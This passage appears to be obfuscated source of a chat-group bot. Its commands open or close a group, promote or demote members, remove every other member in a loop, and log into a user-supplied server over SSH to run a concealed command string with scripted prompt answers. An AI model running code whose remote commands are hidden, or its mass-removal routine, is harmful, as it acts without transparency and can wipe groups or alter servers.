                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xff9)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x886)]:
        case _0x2a5309[_0x5d4417(0x222)]:
        case _0x2a5309[_0x5d4417(0x98f)]:
        case _0x2a5309[_0x5d4417(0x1dd)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0xe98)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0xedb653[_0x5d4417(0xd6d)])
                    return _0x2a5309[_0x5d4417(0x764)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                    return _0x2a5309[_0x5d4417(0x448)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                if (/open|opengc/[_0x5d4417(0x8cc)](_0x224056)) {
                    if (_0x2a5309[_0x5d4417(0x1010)](_0xedb653[_0x5d4417(0x2e8)][_0x5d4417(0xd7a)], ![]))
                        return;
                    await _0x57ed02[_0x5d4417(0xf3d) + _0x5d4417(0x3ac)](_0xedb653[_0x5d4417(0x9e2)], _0x2a5309[_0x5d4417(0x3c3)]);
                } else {
                    if (/closegc|close/[_0x5d4417(0x8cc)](_0x224056)) {
                        if (_0x2a5309[_0x5d4417(0x120c)](_0xedb653[_0x5d4417(0x2e8)][_0x5d4417(0xd7a)], !![]))
                            return;
                        await _0x57ed02[_0x5d4417(0xf3d) + _0x5d4417(0x3ac)](_0xedb653[_0x5d4417(0x9e2)], _0x2a5309[_0x5d4417(0x489)]);
                    } else {
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xd0e)]:
        case _0x2a5309[_0x5d4417(0xa0f)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xfe9)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x5a48c2 = await _0xedb653[_0x5d4417(0x2e8)][_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0x462)](_0x24ddd1 => _0x24ddd1['id'])[_0x5d4417(0xde7)](_0x1649c1 => _0x1649c1 !== _0x4815f3 && _0x1649c1 !== _0xedb653[_0x5d4417(0xeee)]);
                if (_0x2a5309[_0x5d4417(0xc1e)](_0x5a48c2[_0x5d4417(0xf65)], 0x19 * 0x151 + 0x1 * 0x2291 + -0x4379))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa0c)]);
                await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1176)]);
                for (let _0x5d2657 of _0x5a48c2) {
                    await _0x57ed02[_0x5d4417(0x21d) + _0x5d4417(0x9ec) + _0x5d4417(0x10f4)](_0xedb653[_0x5d4417(0x9e2)], [_0x5d2657], _0x2a5309[_0x5d4417(0x6ea)]), await _0x2a5309[_0x5d4417(0x4b4)](sleep, 0x9de + 0x30a * -0x1 + -0x2ec * 0x1);
                }
                await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x9a0)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x2c3)]:
        case _0x2a5309[_0x5d4417(0xa2e)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0xc50)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0xedb653[_0x5d4417(0xd6d)])
                    return _0x2a5309[_0x5d4417(0xdcb)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                    return _0x2a5309[_0x5d4417(0x87d)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                if (_0xedb653[_0x5d4417(0x7eb)] || _0x156b97) {
                    var _0x1ff5d7;
                    let _0x2fb9cb = _0xedb653[_0x5d4417(0x10f9) + 'id'][-0x1ad5 + 0x887 * -0x1 + 0x235c] ? _0xedb653[_0x5d4417(0x10f9) + 'id'][0x1f * 0xdd + -0x10c * 0x2 + 0x5 * -0x4ef] : _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x2a5309[_0x5d4417(0x3be)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]);
                    if (/demote/[_0x5d4417(0x8cc)](_0x224056))
                        _0x1ff5d7 = _0x2a5309[_0x5d4417(0x749)];
                    if (/promote/[_0x5d4417(0x8cc)](_0x224056))
                        _0x1ff5d7 = _0x2a5309[_0x5d4417(0xb43)];
                    await _0x57ed02[_0x5d4417(0x21d) + _0x5d4417(0x9ec) + _0x5d4417(0x10f4)](_0xedb653[_0x5d4417(0x9e2)], [_0x2fb9cb], _0x1ff5d7[_0x5d4417(0xec1) + 'e']())[_0x5d4417(0xe2e)](async () => {
                        const _0x235246 = _0x5d4417;
                        await _0x57ed02[_0x235246(0x367) + 'e'](_0xedb653[_0x235246(0x9e2)], {
                            'text': _0x235246(0x798) + _0x1ff5d7[_0x235246(0xec1) + 'e']() + '\x20@' + _0x2fb9cb[_0x235246(0xc6c)]('@')[-0x5a1 + 0x56a + 0x37],
                            'mentions': [_0x2fb9cb]
                        }, { 'quoted': _0xedb653 });
                    });
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe98)](_0x1ac933, _0x2a5309[_0x5d4417(0x949)]));
            }
            break;
        case _0x2a5309[_0x5d4417(0xa28)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xb0d)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97 || !_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe5d)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                let _0x483e4e = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0x6e1)](_0x483e4e[_0x5d4417(0xf65)], -0x454 + 0x50a * 0x3 + 0x1 * -0xac8))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb4f)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                global[_0x5d4417(0x7e3) + 'a'] = {
                    'vps': _0x483e4e[-0x113 * -0x2 + -0x1 * 0x9d9 + -0x7b3 * -0x1],
                    'pwvps': _0x483e4e[-0xb6 + -0xf * 0x1 + 0xc6]
                };
                let _0x471a26 = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0xe68)], _0xf32109 = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0x679)], _0x68956b = _0x156b97;
                const _0x406456 = {
                        'host': _0x471a26,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0xf32109
                    }, _0x266367 = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0xd47) + _0x5d4417(0x62c) + _0x5d4417(0xbf9) + _0x5d4417(0xe02) + _0x5d4417(0x1d2) + _0x5d4417(0xb83) + _0x5d4417(0xda5) + _0x5d4417(0x5cf) + _0x5d4417(0x1111), _0x291add = new Client();
                await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x21f)]), _0x291add['on'](_0x2a5309[_0x5d4417(0x186)], () => {
                    const _0xfa15f6 = _0x5d4417, _0x17ebf2 = {
                            'UGPJx': _0x2a5309[_0xfa15f6(0x10ae)],
                            'yReZc': function (_0x4dc14d, _0x472cc7) {
                                const _0x2cb187 = _0xfa15f6;
                                return _0x2a5309[_0x2cb187(0x3d1)](_0x4dc14d, _0x472cc7);
                            },
                            'WIfab': _0x2a5309[_0xfa15f6(0x778)]
                        };
                    _0x291add[_0xfa15f6(0xdd9)](_0x266367, (_0x3defbc, _0xe07256) => {
                        const _0x3b91fd = _0xfa15f6, _0x180b8a = { 'Fwcyh': _0x2a5309[_0x3b91fd(0x1172)] };
                        if (_0x3defbc)
                            throw _0x3defbc;
                        _0xe07256['on'](_0x2a5309[_0x3b91fd(0x222)], async (_0x3e37ef, _0x3e03de) => {
                            const _0x3b27bb = _0x3b91fd;
                            await _0xedb653[_0x3b27bb(0x105d)](_0x17ebf2[_0x3b27bb(0xaaf)]), _0x291add[_0x3b27bb(0x825)]();
                        })['on'](_0x2a5309[_0x3b91fd(0xc8c)], async _0x10bbf2 => {
                            const _0x3c2d59 = _0x3b91fd, _0x49a4cf = _0x180b8a[_0x3c2d59(0x84b)][_0x3c2d59(0xc6c)]('|');
                            let _0xc1b118 = 0x63b + 0x14bb + -0x1af6;
                            while (!![]) {
                                switch (_0x49a4cf[_0xc1b118++]) {
                                case '0':
                                    _0xe07256[_0x3c2d59(0xbf8)]('2\x0a');
                                    continue;
                                case '1':
                                    _0xe07256[_0x3c2d59(0xbf8)](_0x3c2d59(0x101e));
                                    continue;
                                case '2':
                                    console[_0x3c2d59(0xd16)](_0x10bbf2[_0x3c2d59(0xef4)]());
                                    continue;
                                case '3':
                                    _0xe07256[_0x3c2d59(0xbf8)]('y\x0a');
                                    continue;
                                case '4':
                                    _0xe07256[_0x3c2d59(0xbf8)]('x\x0a');
                                    continue;
                                }
                                break;
                            }
                        })[_0x3b91fd(0x553)]['on'](_0x2a5309[_0x3b91fd(0xc8c)], _0x8350fd => {
                            const _0x374a95 = _0x3b91fd;
                            console[_0x374a95(0xd16)](_0x17ebf2[_0x374a95(0xf67)](_0x17ebf2[_0x374a95(0x1024)], _0x8350fd));
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x89e50c => {
                    const _0x551415 = _0x5d4417;
                    console[_0x551415(0xd16)](_0x2a5309[_0x551415(0x45e)](_0x2a5309[_0x551415(0xc71)], _0x89e50c)), _0xedb653[_0x551415(0x105d)](_0x2a5309[_0x551415(0x469)]);
                })[_0x5d4417(0x1091)](_0x406456);
            }
            break;
        case _0x2a5309[_0x5d4417(0x2b5)]:
        case _0x2a5309[_0x5d4417(0xcaa)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x100b)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97 || !_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x52e)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                let _0x1e813c = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0xc1e)](_0x1e813c[_0x5d4417(0xf65)], 0x43 * 0x4d + 0x14ec + -0x2911 * 0x1))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x11b6)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                global[_0x5d4417(0x7e3) + 'a'] = {
                    'vps': _0x1e813c[-0x7a1 * -0x1 + 0xc * -0x2ab + 0x1863],
                    'pwvps': _0x1e813c[-0x26c4 + -0x3ef * -0x5 + 0x131a]
                };
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x100b)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (_0x2a5309[_0x5d4417(0x105c)](global[_0x5d4417(0x7e3) + 'a'], undefined))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd0c)]);
                let _0x392b02 = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0xe68)], _0xd25954 = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0x679)];
                const _0x5852ee = {
                        'host': _0x392b02,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0xd25954
                    }, _0x357751 = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0xd47) + _0x5d4417(0x62c) + _0x5d4417(0xbf9) + _0x5d4417(0xe02) + _0x5d4417(0x1d2) + _0x5d4417(0xb83) + _0x5d4417(0xda5) + _0x5d4417(0x5cf) + _0x5d4417(0x1111), _0x5bf177 = new Client();
                _0x5bf177['on'](_0x2a5309[_0x5d4417(0x186)], async () => {
                    const _0x557958 = _0x5d4417, _0x16c466 = {
                            'PEmEd': function (_0x3658f8, _0x146cef) {
                                const _0x58bc60 = _0x4f4e;
                                return _0x2a5309[_0x58bc60(0x61e)](_0x3658f8, _0x146cef);
                            },
                            'GMOMd': _0x2a5309[_0x557958(0x778)]
                        };
                    _0xedb653[_0x557958(0x105d)](_0x2a5309[_0x557958(0xac2)]), _0x5bf177[_0x557958(0xdd9)](_0x357751, (_0x101f60, _0x49ff47) => {
                        const _0x5167e7 = _0x557958, _0x499b62 = {
                                'QQjsK': _0x2a5309[_0x5167e7(0x662)],
                                'AbwtB': _0x2a5309[_0x5167e7(0x318)]
                            };
                        if (_0x101f60)
                            throw _0x101f60;
                        _0x49ff47['on'](_0x2a5309[_0x5167e7(0x222)], async (_0x3e7a34, _0x1b8d72) => {
                            const _0x163126 = _0x5167e7;
                            await _0xedb653[_0x163126(0x105d)](_0x499b62[_0x163126(0x9d0)]), _0x5bf177[_0x163126(0x825)]();
                        })['on'](_0x2a5309[_0x5167e7(0xc8c)], async _0xd39b00 => {
                            const _0x43bc71 = _0x5167e7, _0x5cf92c = _0x499b62[_0x43bc71(0xe20)][_0x43bc71(0xc6c)]('|');
                            let _0x13e6aa = -0xa5 * -0x1c + 0x2546 + -0x3752;
                            while (!![]) {
                                switch (_0x5cf92c[_0x13e6aa++]) {
                                case '0':
                                    _0x49ff47[_0x43bc71(0xbf8)](_0x43bc71(0x101e));
                                    continue;
                                case '1':
                                    _0x49ff47[_0x43bc71(0xbf8)]('x\x0a');
                                    continue;
                                case '2':
                                    _0x49ff47[_0x43bc71(0xbf8)]('1\x0a');
                                    continue;
                                case '3':
                                    console[_0x43bc71(0xd16)](_0xd39b00[_0x43bc71(0xef4)]());
                                    continue;
                                case '4':
                                    _0x49ff47[_0x43bc71(0xbf8)]('1\x0a');
                                    continue;
                                case '5':
                                    _0x49ff47[_0x43bc71(0xbf8)](_0x43bc71(0x5b8));
                                    continue;
                                }
                                break;
                            }
                        })[_0x5167e7(0x553)]['on'](_0x2a5309[_0x5167e7(0xc8c)], _0x12927a => {
                            const _0x380816 = _0x5167e7;
                            console[_0x380816(0xd16)](_0x16c466[_0x380816(0x59e)](_0x16c466[_0x380816(0xc6e)], _0x12927a));
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x3d5777 => {
                    const _0x399e22 = _0x5d4417;
                    console[_0x399e22(0xd16)](_0x2a5309[_0x399e22(0x6d1)](_0x2a5309[_0x399e22(0xc71)], _0x3d5777)), _0xedb653[_0x399e22(0x105d)](_0x2a5309[_0x399e22(0x469)]);
                })[_0x5d4417(0x1091)](_0x5852ee);
            }
            break;
        case _0x2a5309[_0x5d4417(0x953)]:
        case _0x2a5309[_0x5d4417(0xd54)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xc50)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97 || !_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc88)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                let _0x2249aa = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0x4ed)](_0x2249aa[_0x5d4417(0xf65)], -0x1659 + 0x6c0 + 0xf9b))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x7c2)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                global[_0x5d4417(0x7e3) + 'a'] = {
                    'vps': _0x2249aa[0x4f * -0x1f + -0x3 * -0xb95 + -0x24a * 0xb],
                    'pwvps': _0x2249aa[0x1579 + -0x1 * 0x15 + 0x1 * -0x1563]
                };
                if (_0x2a5309[_0x5d4417(0xd08)](global[_0x5d4417(0x7e3) + 'a'], undefined))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd0c)]);
                let _0x481597 = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0xe68)], _0x31f8cf = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0x679)];
                const _0x332849 = {
                        'host': _0x481597,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0x31f8cf
                    }, _0x5c1592 = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0xd47) + _0x5d4417(0x62c) + _0x5d4417(0xbf9) + _0x5d4417(0xe02) + _0x5d4417(0x1d2) + _0x5d4417(0xb83) + _0x5d4417(0xda5) + _0x5d4417(0x5cf) + _0x5d4417(0x1111), _0x393d7e = new Client();
                _0x393d7e['on'](_0x2a5309[_0x5d4417(0x186)], () => {
                    const _0x1b526f = _0x5d4417, _0x22dfd0 = {
                            'HQVEn': _0x2a5309[_0x1b526f(0x4d0)],
                            'xbJPW': _0x2a5309[_0x1b526f(0x79d)]
                        };
                    _0xedb653[_0x1b526f(0x105d)](_0x2a5309[_0x1b526f(0x48d)]), _0x393d7e[_0x1b526f(0xdd9)](_0x5c1592, (_0x417b5b, _0x3bfb6a) => {
                        const _0x2dd788 = _0x1b526f, _0x4451 = {
                                'fzjdr': function (_0x316648, _0x142f78) {
                                    const _0x5ad5d2 = _0x4f4e;
                                    return _0x2a5309[_0x5ad5d2(0x61e)](_0x316648, _0x142f78);
                                },
                                'XfcCf': _0x2a5309[_0x2dd788(0x778)]
                            };
                        if (_0x417b5b)
                            throw _0x417b5b;
                        _0x3bfb6a['on'](_0x2a5309[_0x2dd788(0x222)], async (_0x44feb1, _0x11849c) => {
                            const _0x1d9c9a = _0x2dd788;
                            await _0xedb653[_0x1d9c9a(0x105d)](_0x22dfd0[_0x1d9c9a(0xcbe)]), _0x393d7e[_0x1d9c9a(0x825)]();
                        })['on'](_0x2a5309[_0x2dd788(0xc8c)], async _0x4ed586 => {
                            const _0x11c2e7 = _0x2dd788, _0x22913a = _0x22dfd0[_0x11c2e7(0x85f)][_0x11c2e7(0xc6c)]('|');
                            let _0x353b64 = -0x2215 + 0x1f77 + 0x86 * 0x5;
                            while (!![]) {
                                switch (_0x22913a[_0x353b64++]) {
                                case '0':
                                    _0x3bfb6a[_0x11c2e7(0xbf8)](_0x11c2e7(0x101e));
                                    continue;
                                case '1':
                                    _0x3bfb6a[_0x11c2e7(0xbf8)](_0x11c2e7(0x5b8));
                                    continue;
                                case '2':
                                    console[_0x11c2e7(0xd16)](_0x4ed586[_0x11c2e7(0xef4)]());
                                    continue;
                                case '3':
                                    _0x3bfb6a[_0x11c2e7(0xbf8)]('2\x0a');
                                    continue;
                                case '4':
                                    _0x3bfb6a[_0x11c2e7(0xbf8)]('1\x0a');
                                    continue;
                                case '5':
                                    _0x3bfb6a[_0x11c2e7(0xbf8)]('x\x0a');
                                    continue;
                                }
                                break;
                            }
                        })[_0x2dd788(0x553)]['on'](_0x2a5309[_0x2dd788(0xc8c)], _0x1d408a => {
                            const _0x82f02e = _0x2dd788;
                            console[_0x82f02e(0xd16)](_0x4451[_0x82f02e(0x98c)](_0x4451[_0x82f02e(0x97f)], _0x1d408a));
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x4a449b => {
                    const _0xc971a0 = _0x5d4417;
                    console[_0xc971a0(0xd16)](_0x2a5309[_0xc971a0(0x110a)](_0x2a5309[_0xc971a0(0xc71)], _0x4a449b)), _0xedb653[_0xc971a0(0x105d)](_0x2a5309[_0xc971a0(0x469)]);
                })[_0x5d4417(0x1091)](_0x332849);
            }
            break;
        case _0x2a5309[_0x5d4417(0xe53)]:
        case _0x2a5309[_0x5d4417(0x9dc)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xd3d)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97 || !_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb77)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                let _0x39d390 = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0xce9)](_0x39d390[_0x5d4417(0xf65)], 0x1c8b * 0x1 + 0x2bc + -0x1f45))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe6c)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                global[_0x5d4417(0x7e3) + 'a'] = {
                    'vps': _0x39d390[0x462 + 0x816 + -0x4 * 0x31e],
                    'pwvps': _0x39d390[0x936 * -0x2 + -0x601 * 0x3 + 0x2470 * 0x1]
                };
                if (_0x2a5309[_0x5d4417(0xb42)](global[_0x5d4417(0x7e3) + 'a'], undefined))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd0c)]);
                let _0x429177 = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0xe68)], _0x4c231e = global[_0x5d4417(0x7e3) + 'a'][_0x5d4417(0x679)];
                const _0x3d320e = {
                        'host': _0x429177,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0x4c231e
                    }, _0x29328b = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0xd47) + _0x5d4417(0x62c) + _0x5d4417(0xbf9) + _0x5d4417(0xe02) + _0x5d4417(0x1d2) + _0x5d4417(0xb83) + _0x5d4417(0xda5) + _0x5d4417(0x5cf) + _0x5d4417(0x1111), _0x588614 = new Client();
                _0x588614['on'](_0x2a5309[_0x5d4417(0x186)], () => {
                    const _0x233443 = _0x5d4417;
                    _0xedb653[_0x233443(0x105d)](_0x2a5309[_0x233443(0xcf3)]), _0x588614[_0x233443(0xdd9)](_0x29328b, (_0x100756, _0x385670) => {
                        const _0x4d93b7 = _0x233443, _0x1ad2b3 = {
                                'iBkZd': _0x2a5309[_0x4d93b7(0xd52)],
                                'cOfFP': _0x2a5309[_0x4d93b7(0x1124)],
                                'oaeQQ': _0x2a5309[_0x4d93b7(0xb76)],
                                'Nxvhk': _0x2a5309[_0x4d93b7(0xf08)],
                                'euLYi': _0x2a5309[_0x4d93b7(0xb0c)],
                                'MBZwn': _0x2a5309[_0x4d93b7(0x56c)],
                                'eHkcR': function (_0x6c94, _0x19cd8c) {
                                    const _0x3849b6 = _0x4d93b7;
                                    return _0x2a5309[_0x3849b6(0xa09)](_0x6c94, _0x19cd8c);
                                },
                                'bWcYi': _0x2a5309[_0x4d93b7(0x778)]
                            };
                        if (_0x100756)
                            throw _0x100756;
                        _0x385670['on'](_0x2a5309[_0x4d93b7(0x222)], async (_0x3911e7, _0x1b0c72) => {
                            const _0x265766 = _0x4d93b7;
                            await _0xedb653[_0x265766(0x105d)](_0x1ad2b3[_0x265766(0x850)]), _0x588614[_0x265766(0x825)]();
                        })['on'](_0x2a5309[_0x4d93b7(0xc8c)], async _0x2ee1a9 => {
                            const _0xa81929 = _0x4d93b7, _0x3a8e5a = _0x1ad2b3[_0xa81929(0xb7b)][_0xa81929(0xc6c)]('|');
                            let _0x4cf83f = -0x859 + 0x326 * 0xa + -0x1723;
                            while (!![]) {
                                switch (_0x3a8e5a[_0x4cf83f++]) {
                                case '0':
                                    _0x385670[_0xa81929(0xbf8)](_0x1ad2b3[_0xa81929(0xba6)]);
                                    continue;
                                case '1':
                                    _0x385670[_0xa81929(0xbf8)](_0x1ad2b3[_0xa81929(0xc5c)]);
                                    continue;
                                case '2':
                                    _0x385670[_0xa81929(0xbf8)]('x\x0a');
                                    continue;
                                case '3':
                                    console[_0xa81929(0xd16)](_0x2ee1a9[_0xa81929(0xef4)]());
                                    continue;
                                case '4':
                                    _0x385670[_0xa81929(0xbf8)]('1\x0a');
                                    continue;
                                case '5':
                                    _0x385670[_0xa81929(0xbf8)](_0xa81929(0x101e));
                                    continue;
                                case '6':
                                    _0x385670[_0xa81929(0xbf8)](_0x1ad2b3[_0xa81929(0x6de)]);
                                    continue;
                                case '7':
                                    _0x385670[_0xa81929(0xbf8)]('3\x0a');
                                    continue;
                                case '8':
                                    _0x385670[_0xa81929(0xbf8)](_0x1ad2b3[_0xa81929(0x33d)]);
                                    continue;
                                }
                                break;
                            }
                        })[_0x4d93b7(0x553)]['on'](_0x2a5309[_0x4d93b7(0xc8c)], _0x15e4a3 => {
                            const _0x330eb4 = _0x4d93b7;
                            console[_0x330eb4(0xd16)](_0x1ad2b3[_0x330eb4(0x6f7)](_0x1ad2b3[_0x330eb4(0xa17)], _0x15e4a3));
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x5071ed => {
                    const _0x1879cd = _0x5d4417;
                    console[_0x1879cd(0xd16)](_0x2a5309[_0x1879cd(0xaf3)](_0x2a5309[_0x1879cd(0xc71)], _0x5071ed)), _0xedb653[_0x1879cd(0x105d)](_0x2a5309[_0x1879cd(0x469)]);
                })[_0x5d4417(0x1091)](_0x3d320e);
            }
            break;
        case _0x2a5309[_0x5d4417(0x99f)]: {
                if (!_0x47f98c)
                    return _0xedb653[_0x5d4417(0x105d)](msg[_0x5d4417(0x41d)]);
                if (!_0x156b97 || !_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xcd9)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                var _0x4cce39 = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0xce9)](_0x4cce39[_0x5d4417(0xf65)], 0x5ef + 0x51b + -0xb08))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe04)](_0x1ac933, _0x2a5309[_0x5d4417(0x59b)]));
                let _0x3973b7 = _0x4cce39[-0x642 + -0x2e7 * -0x6 + -0xb28], _0x456051 = _0x4cce39[0x184e + -0x141b * -0x1 + -0x2c68];
                const _0x29a57e = {
                        'host': _0x3973b7,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0x456051
                    }, _0x487b89 = '\x0a', _0x1bb7ae = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0x47f) + _0x5d4417(0x2a4) + _0x5d4417(0x8e1), _0x56db57 = new Client();
                _0x56db57['on'](_0x2a5309[_0x5d4417(0x186)], async () => {
                    const _0xceb14d = _0x5d4417, _0x2329ec = {
                            'CcVnj': function (_0x5a48a5, _0x1d9451) {
                                const _0x525156 = _0x4f4e;
                                return _0x2a5309[_0x525156(0x45e)](_0x5a48a5, _0x1d9451);
                            },
                            'MfeVU': _0x2a5309[_0xceb14d(0x778)],
                            'JeoHv': _0x2a5309[_0xceb14d(0x10ad)],
                            'EKhQC': _0x2a5309[_0xceb14d(0xb25)],
                            'zhirZ': _0x2a5309[_0xceb14d(0x222)],
                            'avUrz': _0x2a5309[_0xceb14d(0xc8c)],
                            'YuQUw': _0x2a5309[_0xceb14d(0x10f6)]
                        };
                    await _0xedb653[_0xceb14d(0x105d)](_0x2a5309[_0xceb14d(0x102f)]), _0x56db57[_0xceb14d(0xdd9)](_0x1bb7ae, async (_0x4e2b90, _0x3d31ca) => {
                        const _0x2b99f0 = _0xceb14d, _0x46dfca = {
                                'nKSZM': _0x2329ec[_0x2b99f0(0xeb2)],
                                'EIYnf': _0x2329ec[_0x2b99f0(0xbeb)],
                                'hbWfr': _0x2329ec[_0x2b99f0(0x46c)],
                                'fXVyS': _0x2329ec[_0x2b99f0(0xd69)],
                                'znYvU': _0x2329ec[_0x2b99f0(0x1a5)]
                            };
                        if (_0x4e2b90)
                            throw _0x4e2b90;
                        _0x3d31ca['on'](_0x2329ec[_0x2b99f0(0x46c)], async (_0x3b1bcd, _0x137603) => {
                            const _0xda3a0a = _0x2b99f0, _0x5c714f = {
                                    'nGaao': _0x46dfca[_0xda3a0a(0xef1)],
                                    'nLQpR': _0x46dfca[_0xda3a0a(0x4f8)],
                                    'VsDcj': _0x46dfca[_0xda3a0a(0x1164)],
                                    'WxukA': _0x46dfca[_0xda3a0a(0xf3a)]
                                };
                            await _0x56db57[_0xda3a0a(0xdd9)](_0x487b89, async (_0x16a91b, _0x4fd116) => {
                                const _0x6ff364 = _0xda3a0a, _0x4c8611 = { 'PMyDT': _0x5c714f[_0x6ff364(0xd96)] };
                                if (_0x16a91b)
                                    throw _0x16a91b;
                                _0x4fd116['on'](_0x5c714f[_0x6ff364(0x78c)], async (_0x6165a3, _0x13a455) => {
                                    const _0x43a925 = _0x6ff364;
                                    await _0xedb653[_0x43a925(0x105d)](_0x4c8611[_0x43a925(0xd0a)]);
                                })['on'](_0x5c714f[_0x6ff364(0x968)], async _0x50eac8 => {
                                    const _0x3871fc = _0x6ff364;
                                    await console[_0x3871fc(0xd16)](_0x50eac8[_0x3871fc(0xef4)]()), _0x50eac8[_0x3871fc(0xef4)]()[_0x3871fc(0x3d3)](_0x3871fc(0x9df) + _0x3871fc(0x2fe) + _0x3871fc(0xbdd) + _0x3871fc(0xade)) && await _0x4fd116[_0x3871fc(0xbf8)]('\x09\x0a');
                                })[_0x6ff364(0x553)]['on'](_0x5c714f[_0x6ff364(0x968)], _0x59d3b0 => {
                                    const _0x495822 = _0x6ff364;
                                    _0xedb653[_0x495822(0x105d)](_0x5c714f[_0x495822(0x71e)]);
                                });
                            });
                        })['on'](_0x2329ec[_0x2b99f0(0xd69)], async _0x597068 => {
                            const _0xc4324a = _0x2b99f0, _0x4ca954 = _0x46dfca[_0xc4324a(0x117a)][_0xc4324a(0xc6c)]('|');
